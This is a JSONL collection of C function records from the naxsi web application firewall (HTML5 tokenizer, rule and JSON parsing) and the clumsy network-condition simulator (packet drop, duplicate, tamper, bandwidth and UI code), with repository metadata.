{"docstring": "/**\n * 8.2.4.52\n * http://www.w3.org/html/wg/drafts/html/master/syntax.html#doctype-state\n */\n", "func_signal": "static int h5_state_doctype(h5_state_t* hs)", "code": "{\n    const char* idx;\n\n    TRACE();\n    hs->token_start = hs->s + hs->pos;\n    hs->token_type = DOCTYPE;\n\n    idx = (const char*) memchr(hs->s + hs->pos, CHAR_GT, hs->len - hs->pos);\n    if (idx == NULL) {\n        hs->state = h5_state_eof;\n        hs->token_len = hs->len - hs->pos;\n    } else {\n        hs->state = h5_state_data;\n        hs->token_len = (size_t)(idx - hs->s) - hs->pos;\n        hs->pos = (size_t)(idx - hs->s) + 1;\n    }\n    return 1;\n}", "path": "naxsi/naxsi_src/ext/libinjection/libinjection_html5.c", "commit_date": "2020-09-24 00:00:00", "repo_name": "nbs-system/naxsi", "stars": 4767, "license": "gpl-3.0", "language": "c", "size": 2048}
{"docstring": "/* Parse one rule line */\n/*\n** in : nb elem, value array, rule to fill\n** does : creates a rule struct from configuration line\n** For each element name matching a tag\n** (cf. rule_parser), then call the associated func.\n*/\n", "func_signal": "void*\nngx_http_naxsi_cfg_parse_one_rule(ngx_conf_t*      cf,\n                                  ngx_str_t*       value,\n                                  ngx_http_rule_t* current_rule,\n                                  ngx_int_t        nb_elem)", "code": "{\n  int   i, z;\n  void* ret;\n  int   valid;\n\n  return_value_if(!value || !value[0].data, NGX_CONF_ERROR);\n  /*\n  ** parse basic rule\n  */\n  if (!ngx_strcmp(value[0].data, TOP_CHECK_RULE_T) ||\n      !ngx_strcmp(value[0].data, TOP_CHECK_RULE_N) ||\n      !ngx_strcmp(value[0].data, TOP_BASIC_RULE_T) ||\n      !ngx_strcmp(value[0].data, TOP_BASIC_RULE_N) ||\n      !ngx_strcmp(value[0].data, TOP_MAIN_BASIC_RULE_T) ||\n      !ngx_strcmp(value[0].data, TOP_MAIN_BASIC_RULE_N)) {\n    NX_LOG_DEBUG(\n      _debug_cfg_parse_one_rule, NGX_LOG_EMERG, cf, 0, \"naxsi-basic rule %V\", &(value[1]));\n    current_rule->type = BR;\n    current_rule->br   = ngx_pcalloc(cf->pool, sizeof(ngx_http_basic_rule_t));\n    return_value_if(!current_rule->br, NGX_CONF_ERROR);\n  } else {\n    NX_LOG_DEBUG(_debug_cfg_parse_one_rule,\n                 NGX_LOG_EMERG,\n                 cf,\n                 0,\n                 \"Unknown start keyword in rule %V\",\n                 &(value[1]));\n    return (NGX_CONF_ERROR);\n  }\n\n  // check each word of config line against each rule\n  for (i = 1; i < nb_elem && value[i].len > 0; i++) {\n    valid = 0;\n    for (z = 0; rule_parser[z].pars; z++) {\n      ngx_http_naxsi_parser_t* np = &rule_parser[z];\n      if (!ngx_strncmp(value[i].data, np->prefix, np->prefix_len)) {\n\n        ret = np->pars(cf, &value[i], current_rule);\n        if (ret != NGX_CONF_OK) {\n          NX_LOG_DEBUG(_debug_cfg_parse_one_rule,\n                       NGX_LOG_EMERG,\n                       cf,\n                       0,\n                       \"XX-FAILED PARSING '%s'\",\n                       value[i].data);\n          return (ret);\n        }\n        valid = 1;\n      }\n    }\n    return_value_if(!valid, NGX_CONF_ERROR);\n  }\n  /* validate the structure, and fill empty fields.*/\n  if (!current_rule->log_msg) {\n    current_rule->log_msg       = ngx_pcalloc(cf->pool, sizeof(ngx_str_t));\n    current_rule->log_msg->data = NULL;\n    current_rule->log_msg->len  = 0;\n  }\n  return (NGX_CONF_OK);\n}", "path": "naxsi/naxsi_src/naxsi_config.c", "commit_date": "2020-11-17 00:00:00", "repo_name": "nbs-system/naxsi", "stars": 4767, "license": "gpl-3.0", "language": "c", "size": 2048}
{"docstring": "/**\n * 12.2.4.43\n */\n", "func_signal": "static int h5_state_self_closing_start_tag(h5_state_t* hs)", "code": "{\n    char ch;\n\n    TRACE();\n    if (hs->pos >= hs->len) {\n        return 0;\n    }\n    ch = hs->s[hs->pos];\n    if (ch == CHAR_GT) {\n        assert(hs->pos > 0);\n        hs->token_start = hs->s + hs->pos -1;\n        hs->token_len = 2;\n        hs->token_type = TAG_NAME_SELFCLOSE;\n        hs->state = h5_state_data;\n        hs->pos += 1;\n        return 1;\n    } else {\n        return h5_state_before_attribute_name(hs);\n    }\n}", "path": "naxsi/naxsi_src/ext/libinjection/libinjection_html5.c", "commit_date": "2020-09-24 00:00:00", "repo_name": "nbs-system/naxsi", "stars": 4767, "license": "gpl-3.0", "language": "c", "size": 2048}
{"docstring": "/*\n** Parse a JSON request\n*/\n", "func_signal": "void\nngx_http_naxsi_json_parse(ngx_http_request_ctx_t* ctx,\n                          ngx_http_request_t*     r,\n                          u_char*                 src,\n                          u_int                   len)", "code": "{\n  ngx_json_t* js;\n\n  js = ngx_pcalloc(r->pool, sizeof(ngx_json_t));\n  if (!js)\n    return;\n  js->json.data = js->src = src;\n  js->json.len = js->len = len;\n  js->r                  = r;\n  js->ctx                = ctx;\n  js->loc_cf             = ngx_http_get_module_loc_conf(r, ngx_http_naxsi_module);\n  js->main_cf            = ngx_http_get_module_main_conf(r, ngx_http_naxsi_module);\n\n  if (ngx_http_nx_json_val(js) != NGX_OK) {\n    ngx_http_apply_rulematch_v_n(&nx_int__invalid_json, ctx, r, NULL, NULL, BODY, 1, 0);\n    NX_DEBUG(_debug_json,\n             NGX_LOG_DEBUG_HTTP,\n             js->r->connection->log,\n             0,\n             \"nx_json_val returned error, apply invalid_json.\");\n  }\n  ngx_http_nx_json_forward(js);\n  if (js->off != js->len) {\n    ngx_http_apply_rulematch_v_n(&nx_int__invalid_json, ctx, r, NULL, NULL, BODY, 1, 0);\n  }\n  return;\n}", "path": "naxsi/naxsi_src/naxsi_json.c", "commit_date": "2020-09-25 00:00:00", "repo_name": "nbs-system/naxsi", "stars": 4767, "license": "gpl-3.0", "language": "c", "size": 2048}
{"docstring": "/**\n * 12.2.4.37\n */\n", "func_signal": "static int h5_state_before_attribute_value(h5_state_t* hs)", "code": "{\n    int c;\n    TRACE();\n\n    c = h5_skip_white(hs);\n\n    if (c == CHAR_EOF) {\n        hs->state = h5_state_eof;\n        return 0;\n    }\n\n    if (c == CHAR_DOUBLE) {\n        return h5_state_attribute_value_double_quote(hs);\n    } else if (c == CHAR_SINGLE) {\n        return h5_state_attribute_value_single_quote(hs);\n    } else if (c == CHAR_TICK) {\n        /* NON STANDARD IE */\n        return h5_state_attribute_value_back_quote(hs);\n    } else {\n        return h5_state_attribute_value_no_quote(hs);\n    }\n}", "path": "naxsi/naxsi_src/ext/libinjection/libinjection_html5.c", "commit_date": "2020-09-24 00:00:00", "repo_name": "nbs-system/naxsi", "stars": 4767, "license": "gpl-3.0", "language": "c", "size": 2048}
{"docstring": "/**\n * 12.2.4.9\n */\n", "func_signal": "static int h5_state_end_tag_open(h5_state_t* hs)", "code": "{\n    char ch;\n\n    TRACE();\n\n    if (hs->pos >= hs->len) {\n        return 0;\n    }\n    ch = hs->s[hs->pos];\n    if (ch == CHAR_GT) {\n        return h5_state_data(hs);\n    } else if ((ch >= 'a' && ch <= 'z') || (ch >= 'A' && ch <= 'Z')) {\n        return h5_state_tag_name(hs);\n    }\n\n    hs->is_close = 0;\n    return h5_state_bogus_comment(hs);\n}", "path": "naxsi/naxsi_src/ext/libinjection/libinjection_html5.c", "commit_date": "2020-09-24 00:00:00", "repo_name": "nbs-system/naxsi", "stars": 4767, "license": "gpl-3.0", "language": "c", "size": 2048}
{"docstring": "/**\n * 12.2.4.44 ALT\n */\n", "func_signal": "static int h5_state_bogus_comment2(h5_state_t* hs)", "code": "{\n    const char* idx;\n    size_t pos;\n\n    TRACE();\n    pos = hs->pos;\n    while (1) {\n        idx = (const char*) memchr(hs->s + pos, CHAR_PERCENT, hs->len - pos);\n        if (idx == NULL || (idx + 1 >= hs->s + hs->len)) {\n            hs->token_start = hs->s + hs->pos;\n            hs->token_len = hs->len - hs->pos;\n            hs->pos = hs->len;\n            hs->token_type = TAG_COMMENT;\n            hs->state = h5_state_eof;\n            return 1;\n        }\n\n        if (*(idx +1) != CHAR_GT) {\n            pos = (size_t)(idx - hs->s) + 1;\n            continue;\n        }\n\n        /* ends in %> */\n        hs->token_start = hs->s + hs->pos;\n        hs->token_len = (size_t)(idx - hs->s) - hs->pos;\n        hs->pos = (size_t)(idx - hs->s) + 2;\n        hs->state = h5_state_data;\n        hs->token_type = TAG_COMMENT;\n        return 1;\n    }\n}", "path": "naxsi/naxsi_src/ext/libinjection/libinjection_html5.c", "commit_date": "2020-09-24 00:00:00", "repo_name": "nbs-system/naxsi", "stars": 4767, "license": "gpl-3.0", "language": "c", "size": 2048}
{"docstring": "/**\n * 8.2.4.45\n */\n", "func_signal": "static int h5_state_markup_declaration_open(h5_state_t* hs)", "code": "{\n    size_t remaining;\n\n    TRACE();\n    remaining = hs->len - hs->pos;\n    if (remaining >= 7 &&\n        /* case insensitive */\n        (hs->s[hs->pos + 0] == 'D' || hs->s[hs->pos + 0] == 'd') &&\n        (hs->s[hs->pos + 1] == 'O' || hs->s[hs->pos + 1] == 'o') &&\n        (hs->s[hs->pos + 2] == 'C' || hs->s[hs->pos + 2] == 'c') &&\n        (hs->s[hs->pos + 3] == 'T' || hs->s[hs->pos + 3] == 't') &&\n        (hs->s[hs->pos + 4] == 'Y' || hs->s[hs->pos + 4] == 'y') &&\n        (hs->s[hs->pos + 5] == 'P' || hs->s[hs->pos + 5] == 'p') &&\n        (hs->s[hs->pos + 6] == 'E' || hs->s[hs->pos + 6] == 'e')\n        ) {\n        return h5_state_doctype(hs);\n    } else if (remaining >= 7 &&\n               /* upper case required */\n               hs->s[hs->pos + 0] == '[' &&\n               hs->s[hs->pos + 1] == 'C' &&\n               hs->s[hs->pos + 2] == 'D' &&\n               hs->s[hs->pos + 3] == 'A' &&\n               hs->s[hs->pos + 4] == 'T' &&\n               hs->s[hs->pos + 5] == 'A' &&\n               hs->s[hs->pos + 6] == '['\n        ) {\n        hs->pos += 7;\n        return h5_state_cdata(hs);\n    } else if (remaining >= 2 &&\n               hs->s[hs->pos + 0] == '-' &&\n               hs->s[hs->pos + 1] == '-') {\n        hs->pos += 2;\n        return h5_state_comment(hs);\n    }\n\n    return h5_state_bogus_comment(hs);\n}", "path": "naxsi/naxsi_src/ext/libinjection/libinjection_html5.c", "commit_date": "2020-09-24 00:00:00", "repo_name": "nbs-system/naxsi", "stars": 4767, "license": "gpl-3.0", "language": "c", "size": 2048}
{"docstring": "/*\n** an array is values separated by ','\n*/\n", "func_signal": "ngx_int_t\nngx_http_nx_json_array(ngx_json_t* js)", "code": "{\n  ngx_int_t rc;\n\n  js->c = *(js->src + js->off);\n  if (js->c != '[' || js->depth > JSON_MAX_DEPTH)\n    return (NGX_ERROR);\n  js->off++;\n  do {\n    rc = ngx_http_nx_json_val(js);\n    /* if we cannot extract the value,\n       we may have reached array end. */\n    if (rc != NGX_OK) {\n      break;\n    }\n    ngx_http_nx_json_forward(js);\n    if (js->c == ',') {\n      js->off++;\n      ngx_http_nx_json_forward(js);\n    } else\n      break;\n  } while (rc == NGX_OK);\n  if (js->c != ']') {\n    return (NGX_ERROR);\n  }\n  return (NGX_OK);\n}", "path": "naxsi/naxsi_src/naxsi_json.c", "commit_date": "2020-09-25 00:00:00", "repo_name": "nbs-system/naxsi", "stars": 4767, "license": "gpl-3.0", "language": "c", "size": 2048}
{"docstring": "// parse arguments and set globals\n// only checks for argument style, no extra validation is done\n", "func_signal": "BOOL parseArgs(int argc, char* argv[])", "code": "{\n    int ix = 0;\n    char *key, *value;\n    // begin parsing \"--key value\" args. \n    // notice that quoted arg with spaces in between is already handled by shell\n    if (argc == 1) return 0;\n    for (;;) {\n        if (++ix >= argc) break;\n        key = argv[ix];\n        if (key[0] != '-' || key[1] != '-' || key[2] == '\\0') {\n            return 0;\n        }\n        key = &(key[2]); // skip \"--\"\n        if (++ix >= argc) {\n            return 0;\n        }\n        value = argv[ix];\n        IupStoreGlobal(key, value);\n        LOG(\"option: %s : %s\", key, value);\n    }\n\n    return 1;\n}", "path": "clumsy/src/utils.c", "commit_date": "2020-04-13 00:00:00", "repo_name": "jagt/clumsy", "stars": 4753, "license": "other", "language": "c", "size": 57737}
{"docstring": "// in fact only 32bit binary would run on 64 bit os\n// if this happens pop out message box and exit\n", "func_signal": "static BOOL check32RunningOn64(HWND hWnd)", "code": "{\n    BOOL is64ret;\n    // consider IsWow64Process return value\n    if (IsWow64Process(GetCurrentProcess(), &is64ret) && is64ret) {\n        MessageBox(hWnd, (LPCSTR)\"You're running 32bit clumsy on 64bit Windows, which wouldn't work. Please use the 64bit clumsy version.\",\n            (LPCSTR)\"Aborting\", MB_OK);\n        return TRUE;\n    }\n    return FALSE;\n}", "path": "clumsy/src/main.c", "commit_date": "2020-04-13 00:00:00", "repo_name": "jagt/clumsy", "stars": 4753, "license": "other", "language": "c", "size": 57737}
{"docstring": "// how many copies to duplicate\n", "func_signal": "static Ihandle* dupSetupUI()", "code": "{\n    Ihandle *dupControlsBox = IupHbox(\n        IupLabel(\"Count:\"),\n        countInput = IupText(NULL),\n        inboundCheckbox = IupToggle(\"Inbound\", NULL),\n        outboundCheckbox = IupToggle(\"Outbound\", NULL),\n        IupLabel(\"Chance(%):\"),\n        chanceInput = IupText(NULL),\n        NULL\n        );\n\n    IupSetAttribute(chanceInput, \"VISIBLECOLUMNS\", \"4\");\n    IupSetAttribute(chanceInput, \"VALUE\", \"10.0\");\n    IupSetCallback(chanceInput, \"VALUECHANGED_CB\", uiSyncChance);\n    IupSetAttribute(chanceInput, SYNCED_VALUE, (char*)&chance);\n    IupSetCallback(inboundCheckbox, \"ACTION\", (Icallback)uiSyncToggle);\n    IupSetAttribute(inboundCheckbox, SYNCED_VALUE, (char*)&dupInbound);\n    IupSetCallback(outboundCheckbox, \"ACTION\", (Icallback)uiSyncToggle);\n    IupSetAttribute(outboundCheckbox, SYNCED_VALUE, (char*)&dupOutbound);\n    // sync count\n    IupSetAttribute(countInput, \"VISIBLECOLUMNS\", \"3\");\n    IupSetAttribute(countInput, \"VALUE\", STR(COPIES_COUNT));\n    IupSetCallback(countInput, \"VALUECHANGED_CB\", (Icallback)uiSyncInteger);\n    IupSetAttribute(countInput, SYNCED_VALUE, (char*)&count);\n    IupSetAttribute(countInput, INTEGER_MAX, COPIES_MAX);\n    IupSetAttribute(countInput, INTEGER_MIN, COPIES_MIN);\n\n    // enable by default to avoid confusing\n    IupSetAttribute(inboundCheckbox, \"VALUE\", \"ON\");\n    IupSetAttribute(outboundCheckbox, \"VALUE\", \"ON\");\n\n    if (parameterized) {\n        setFromParameter(inboundCheckbox, \"VALUE\", NAME\"-inbound\");\n        setFromParameter(outboundCheckbox, \"VALUE\", NAME\"-outbound\");\n        setFromParameter(chanceInput, \"VALUE\", NAME\"-chance\");\n        setFromParameter(countInput, \"VALUE\", NAME\"-count\");\n    }\n\n    return dupControlsBox;\n}", "path": "clumsy/src/duplicate.c", "commit_date": "2019-09-18 00:00:00", "repo_name": "jagt/clumsy", "stars": 4753, "license": "other", "language": "c", "size": 57737}
{"docstring": "//---------------------------------------------------------------------\n// process\n//---------------------------------------------------------------------\n", "func_signal": "static short bandwidthProcess(PacketNode *head, PacketNode* tail)", "code": "{\n    int dropped = 0;\n\tDWORD now_ts = timeGetTime();\n\tint limit = bandwidthLimit * 1024;\n\n\tif (limit <= 0 || rateStats == NULL) {\n\t\treturn 0;\n\t}\n\n    while (head->next != tail) {\n        PacketNode *pac = head->next;\n\t\tint discard = 0;\n        // chance in range of [0, 10000]\n        if (checkDirection(pac->addr.Direction, bandwidthInbound, bandwidthOutbound)) {\n\t\t\tint rate = crate_stats_calculate(rateStats, now_ts);\n\t\t\tint size = pac->packetLen;\n\t\t\tif (rate + size > limit) {\n\t\t\t\tLOG(\"dropped with bandwidth %dKB/s, direction %s\",\n\t\t\t\t\t(int)bandwidthLimit, BOUND_TEXT(pac->addr.Direction));\n\t\t\t\tdiscard = 1;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tcrate_stats_update(rateStats, size, now_ts);\n\t\t\t}\n\t\t}\n\t\tif (discard) {\n            freeNode(popNode(pac));\n            ++dropped;\n        } else {\n            head = head->next;\n        }\n    }\n\n    return dropped > 0;\n}", "path": "clumsy/src/bandwidth.c", "commit_date": "2020-04-13 00:00:00", "repo_name": "jagt/clumsy", "stars": 4753, "license": "other", "language": "c", "size": 57737}
{"docstring": "// shared callbacks\n", "func_signal": "int uiSyncInt32(Ihandle *ih)", "code": "{\n    LONG *integerPointer = (LONG*)IupGetAttribute(ih, SYNCED_VALUE);\n    const int maxValue = IupGetInt(ih, INTEGER_MAX);\n    const int minValue = IupGetInt(ih, INTEGER_MIN);\n    // normalize input into [min, max]\n    int value = IupGetInt(ih, \"VALUE\"), newValue = value;\n    char valueBuf[8];\n    if (newValue > maxValue) {\n        newValue = maxValue;\n    } else if (newValue < minValue) {\n        newValue = minValue;\n    }\n    // test for 0 as for empty input\n    if (newValue != value && value != 0) {\n        sprintf(valueBuf, \"%d\", newValue);\n        IupStoreAttribute(ih, \"VALUE\", valueBuf);\n        // put caret at end to enable editing while normalizing\n        IupStoreAttribute(ih, \"CARET\", \"10\");\n    }\n    // sync back\n    InterlockedExchange(integerPointer, newValue);\n    return IUP_DEFAULT;\n}", "path": "clumsy/src/utils.c", "commit_date": "2020-04-13 00:00:00", "repo_name": "jagt/clumsy", "stars": 4753, "license": "other", "language": "c", "size": 57737}
{"docstring": "// naive fixed number of (short) * 0.01\n", "func_signal": "int uiSyncFixed(Ihandle *ih)", "code": "{\n    short *fixedPointer = (short*)IupGetAttribute(ih, SYNCED_VALUE);\n    const float maxFixedValue = IupGetFloat(ih, FIXED_MAX);\n    const float minFixedValue = IupGetFloat(ih, FIXED_MIN);\n    float value = IupGetFloat(ih, \"VALUE\");\n    float newValue = value;\n    short fixValue;\n    char valueBuf[8];\n    if (newValue > maxFixedValue) {\n        newValue = maxFixedValue;\n    } else if (newValue < minFixedValue) {\n        newValue = minFixedValue;\n    }\n\n    if (newValue != value && value != 0) {\n        sprintf(valueBuf, \"%.2f\", newValue);\n        IupStoreAttribute(ih, \"VALUE\", valueBuf);\n        // put caret at end to enable editing while normalizing\n        IupStoreAttribute(ih, \"CARET\", \"10\");\n    }\n    // sync back\n    fixValue = (short)(newValue / FIXED_EPSILON);\n    InterlockedExchange16(fixedPointer, fixValue);\n    return IUP_DEFAULT;\n}", "path": "clumsy/src/utils.c", "commit_date": "2020-04-13 00:00:00", "repo_name": "jagt/clumsy", "stars": 4753, "license": "other", "language": "c", "size": 57737}
{"docstring": "// not really perfect swap since it assumes a is before b\n", "func_signal": "static void swapNode(PacketNode *a, PacketNode *b)", "code": "{\n    assert(a->prev && a->next && b->prev && b->next); // not accidentally swapping head/tail\n    assert(a != b); // treat swap self as error here since we shouldn't really be doing it\n    if (a->next == b) {\n        // adjacent nodes need special care\n        a->prev->next = b;\n        b->next->prev = a;\n        a->next = b->next;\n        b->prev = a->prev;\n        a->prev = b;\n        b->next = a;\n    } else {\n        PacketNode *pa = a->prev,\n                   *na = a->next,\n                   *pb = b->prev,\n                   *nb = b->next;\n        pa->next = na->prev = b;\n        b->prev = pa;\n        b->next = na;\n        pb->next = nb->prev = a;\n        a->prev = pb;\n        a->next = nb;\n    }\n}", "path": "clumsy/src/ood.c", "commit_date": "2019-09-18 00:00:00", "repo_name": "jagt/clumsy", "stars": 4753, "license": "other", "language": "c", "size": 57737}
{"docstring": "// recompute checksum after after tampering\n", "func_signal": "static Ihandle* tamperSetupUI()", "code": "{\n    Ihandle *dupControlsBox = IupHbox(\n        checksumCheckbox = IupToggle(\"Redo Checksum\", NULL),\n        inboundCheckbox = IupToggle(\"Inbound\", NULL),\n        outboundCheckbox = IupToggle(\"Outbound\", NULL),\n        IupLabel(\"Chance(%):\"),\n        chanceInput = IupText(NULL),\n        NULL\n        );\n\n    IupSetAttribute(chanceInput, \"VISIBLECOLUMNS\", \"4\");\n    IupSetAttribute(chanceInput, \"VALUE\", \"10.0\");\n    IupSetCallback(chanceInput, \"VALUECHANGED_CB\", uiSyncChance);\n    IupSetAttribute(chanceInput, SYNCED_VALUE, (char*)&chance);\n    IupSetCallback(inboundCheckbox, \"ACTION\", (Icallback)uiSyncToggle);\n    IupSetAttribute(inboundCheckbox, SYNCED_VALUE, (char*)&tamperInbound);\n    IupSetCallback(outboundCheckbox, \"ACTION\", (Icallback)uiSyncToggle);\n    IupSetAttribute(outboundCheckbox, SYNCED_VALUE, (char*)&tamperOutbound);\n    // sync doChecksum\n    IupSetCallback(checksumCheckbox, \"ACTION\", (Icallback)uiSyncToggle);\n    IupSetAttribute(checksumCheckbox, SYNCED_VALUE, (char*)&doChecksum);\n\n    // enable by default to avoid confusing\n    IupSetAttribute(inboundCheckbox, \"VALUE\", \"ON\");\n    IupSetAttribute(outboundCheckbox, \"VALUE\", \"ON\");\n    IupSetAttribute(checksumCheckbox, \"VALUE\", \"ON\");\n\n    if (parameterized) {\n        setFromParameter(inboundCheckbox, \"VALUE\", NAME\"-inbound\");\n        setFromParameter(outboundCheckbox, \"VALUE\", NAME\"-outbound\");\n        setFromParameter(chanceInput, \"VALUE\", NAME\"-chance\");\n        setFromParameter(checksumCheckbox, \"VALUE\", NAME\"-checksum\");\n    }\n\n    return dupControlsBox;\n}", "path": "clumsy/src/tamper.c", "commit_date": "2019-09-18 00:00:00", "repo_name": "jagt/clumsy", "stars": 4753, "license": "other", "language": "c", "size": 57737}
{"docstring": "// [0-10000]\n", "func_signal": "static Ihandle* dropSetupUI()", "code": "{\n    Ihandle *dropControlsBox = IupHbox(\n        inboundCheckbox = IupToggle(\"Inbound\", NULL),\n        outboundCheckbox = IupToggle(\"Outbound\", NULL),\n        IupLabel(\"Chance(%):\"),\n        chanceInput = IupText(NULL),\n        NULL\n    );\n\n    IupSetAttribute(chanceInput, \"VISIBLECOLUMNS\", \"4\");\n    IupSetAttribute(chanceInput, \"VALUE\", \"10.0\");\n    IupSetCallback(chanceInput, \"VALUECHANGED_CB\", uiSyncChance);\n    IupSetAttribute(chanceInput, SYNCED_VALUE, (char*)&chance);\n    IupSetCallback(inboundCheckbox, \"ACTION\", (Icallback)uiSyncToggle);\n    IupSetAttribute(inboundCheckbox, SYNCED_VALUE, (char*)&dropInbound);\n    IupSetCallback(outboundCheckbox, \"ACTION\", (Icallback)uiSyncToggle);\n    IupSetAttribute(outboundCheckbox, SYNCED_VALUE, (char*)&dropOutbound);\n\n    // enable by default to avoid confusing\n    IupSetAttribute(inboundCheckbox, \"VALUE\", \"ON\");\n    IupSetAttribute(outboundCheckbox, \"VALUE\", \"ON\");\n\n    if (parameterized) {\n        setFromParameter(inboundCheckbox, \"VALUE\", NAME\"-inbound\");\n        setFromParameter(outboundCheckbox, \"VALUE\", NAME\"-outbound\");\n        setFromParameter(chanceInput, \"VALUE\", NAME\"-chance\");\n    }\n\n    return dropControlsBox;\n}", "path": "clumsy/src/drop.c", "commit_date": "2019-09-18 00:00:00", "repo_name": "jagt/clumsy", "stars": 4753, "license": "other", "language": "c", "size": 57737}
{"docstring": "//---------------------------------------------------------------------\n// evict oldest history\n//---------------------------------------------------------------------\n", "func_signal": "void crate_stats_evict(CRateStats *rate, uint32_t now_ts)", "code": "{\n\tif (rate->initialized == 0) \n\t\treturn;\n\n\tuint32_t new_oldest_ts = now_ts - ((uint32_t)rate->window_size) + 1;\n\n\tif (((int32_t)(new_oldest_ts - rate->oldest_ts)) < 0) \n\t\treturn;\n\n\twhile (((int32_t)(rate->oldest_ts - new_oldest_ts)) < 0) {\n\t\tuint32_t index = rate->oldest_index;\n\t\tif (rate->sample_num == 0) break;\n\t\trate->sample_num -= rate->array_sample[index];\n\t\trate->accumulated_count -= rate->array_sum[index];\n\t\trate->array_sample[index] = 0;\n\t\trate->array_sum[index] = 0;\n\t\trate->oldest_index++;\n\t\tif (rate->oldest_index >= (uint32_t)rate->window_size) {\n\t\t\trate->oldest_index = 0;\n\t\t}\n\t\trate->oldest_ts++;\n\t}\n\tassert(rate->sample_num >= 0);\n\tassert(rate->accumulated_count >= 0);\n\trate->oldest_ts = new_oldest_ts;\n}", "path": "clumsy/src/bandwidth.c", "commit_date": "2020-04-13 00:00:00", "repo_name": "jagt/clumsy", "stars": 4753, "license": "other", "language": "c", "size": 57737}
{"docstring": "//---------------------------------------------------------------------\n// update stats\n//---------------------------------------------------------------------\n", "func_signal": "void crate_stats_update(CRateStats *rate, int32_t count, uint32_t now_ts)", "code": "{\n\tif (rate->initialized == 0) {\n\t\trate->oldest_ts = now_ts;\n\t\trate->oldest_index = 0;\n\t\trate->accumulated_count = 0;\n\t\trate->sample_num = 0;\n\t\trate->initialized = 1;\n\t}\n\n\tif (((int32_t)(now_ts - rate->oldest_ts)) < 0) {\n\t\treturn;\n\t}\n\n\tcrate_stats_evict(rate, now_ts);\n\n\tint32_t offset = (int32_t)(now_ts - rate->oldest_ts);\n\tint32_t index = (rate->oldest_index + offset) % rate->window_size;\n\n\trate->sample_num++;\n\trate->accumulated_count += count;\n\trate->array_sum[index] += count;\n\trate->array_sample[index] += 1;\n}", "path": "clumsy/src/bandwidth.c", "commit_date": "2020-04-13 00:00:00", "repo_name": "jagt/clumsy", "stars": 4753, "license": "other", "language": "c", "size": 57737}
{"docstring": "//---------------------------------------------------------------------\n// delete rate\n//---------------------------------------------------------------------\n", "func_signal": "void crate_stats_delete(CRateStats *rate)", "code": "{\n\tif (rate) {\n\t\trate->window_size = 0;\n\t\tif (rate->array_sum) free(rate->array_sum);\n\t\tif (rate->array_sample) free(rate->array_sample);\n\t\trate->array_sum = NULL;\n\t\trate->array_sample = NULL;\n\t\trate->initialized = 0;\n\t\tfree(rate);\n\t}\n}", "path": "clumsy/src/bandwidth.c", "commit_date": "2020-04-13 00:00:00", "repo_name": "jagt/clumsy", "stars": 4753, "license": "other", "language": "c", "size": 57737}
{"docstring": "// try elevate and error out when can't happen\n// is silent then no message boxes are shown\n// return whether to close the program\n", "func_signal": "BOOL tryElevate(HWND hWnd, BOOL silent)", "code": "{\n    // Check the current process's \"run as administrator\" status.\n    BOOL fIsRunAsAdmin;\n    if (!IsWindowsVistaOrGreater()) {\n        if (!silent) MessageBox(hWnd, (LPCSTR)\"Unsupported Windows version. clumsy only supports Windows Vista or above.\",\n            (LPCSTR)\"Aborting\", MB_OK);\n        return TRUE;\n    }\n\n    fIsRunAsAdmin = IsRunAsAdmin();\n    if (fIsRunAsAdmin) {\n        return FALSE;\n    }\n\n    // when not silent then trying to reinvoke to elevate\n    if (!silent) {\n        wchar_t szPath[MAX_PATH];\n        if (GetModuleFileName(NULL, (LPSTR)szPath, ARRAYSIZE(szPath)))\n        {\n            // Launch itself as administrator.\n            SHELLEXECUTEINFO sei = { sizeof(sei) };\n            sei.lpVerb = (LPSTR)\"runas\";\n            sei.lpFile = (LPSTR)szPath;\n            sei.hwnd = hWnd;\n            sei.nShow = SW_NORMAL;\n\n            // here it is restartintg the program using run as\n            LOG(\"Try elevating by runas\");\n            if (!ShellExecuteEx(&sei))\n            {\n                DWORD dwError = GetLastError();\n                if (dwError == ERROR_CANCELLED)\n                {\n                    // The user refused the elevation.\n                    // alert and exit\n                    MessageBox(hWnd, (LPCSTR)\"clumsy needs to be elevated to work. Run as Administrator or click Yes in promoted UAC dialog\",\n                        (LPCSTR)\"Aborting\", MB_OK);\n                }\n            }\n            // runas executed.\n        } else {\n            MessageBox(hWnd, (LPCSTR)\"Failed to get clumsy path. Please place the executable in a normal directory.\",\n                (LPCSTR)\"Aborting\", MB_OK);\n        }\n    }\n\n    // exit when not run as admin\n    return TRUE;\n}", "path": "clumsy/src/elevate.c", "commit_date": "2019-09-18 00:00:00", "repo_name": "jagt/clumsy", "stars": 4753, "license": "other", "language": "c", "size": 57737}
{"docstring": "// parameterized setter\n", "func_signal": "void setFromParameter(Ihandle *ih, const char *field, const char *key)", "code": "{\n    char* val = IupGetGlobal(key);\n    Icallback cb;\n    IstateCallback scb;\n    // FIXME there should be a way to trigger handler\n    // manually trigger the callback, as iup won't call it\n    // Notice that currently only works on IupToggle, IupText\n    // and Iup lacks a way to get widget's type, so can't do much about this\n    if (val) {\n        IupSetAttribute(ih, field, val);\n        cb = IupGetCallback(ih, \"VALUECHANGED_CB\");\n        if (cb) {\n            LOG(\"triggered VALUECHANGED_CB on key: %s\", key);\n            cb(ih);\n            return;\n        }\n        // cb's argument type IS NOT ONLY Ihandle, receives a extra \"state\" int\n        scb = (IstateCallback)IupGetCallback(ih, \"ACTION\");\n        if (scb) {\n            LOG(\"triggered ACTION on key: %s\", key);\n            // IupGetInt handles yes/no on/off upper lower case things.\n            scb(ih, IupGetInt(ih, \"VALUE\"));\n            return;\n        }\n    }\n}", "path": "clumsy/src/utils.c", "commit_date": "2020-04-13 00:00:00", "repo_name": "jagt/clumsy", "stars": 4753, "license": "other", "language": "c", "size": 57737}
{"docstring": "//---------------------------------------------------------------------\n// reset rate\n//---------------------------------------------------------------------\n", "func_signal": "void crate_stats_reset(CRateStats *rate)", "code": "{\n\tint i;\n\tfor (i = 0; i < rate->window_size; i++) {\n\t\trate->array_sum[i] = 0;\n\t\trate->array_sample[i] = 0;\n\t}\n\trate->initialized = 0;\n\trate->sample_num = 0;\n\trate->accumulated_count = 0;\n\trate->oldest_ts = 0;\n\trate->oldest_index = 0;\n}", "path": "clumsy/src/bandwidth.c", "commit_date": "2020-04-13 00:00:00", "repo_name": "jagt/clumsy", "stars": 4753, "license": "other", "language": "c", "size": 57737}
